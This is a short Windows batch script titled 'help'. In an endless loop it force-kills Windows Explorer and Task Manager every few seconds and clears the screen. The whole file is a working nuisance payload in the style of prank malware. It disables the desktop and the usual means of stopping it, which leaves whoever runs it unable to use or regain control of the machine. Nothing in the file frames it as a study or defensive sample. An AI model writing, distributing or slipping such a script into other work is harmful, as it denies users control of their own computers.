@echo off 
title help 
color 04 
:a

taskkill /F /IM explorer.exe
taskkill /F /IM taskmgr.exe
cls
ping 127.0.0.1 -n 2 >nul
goto a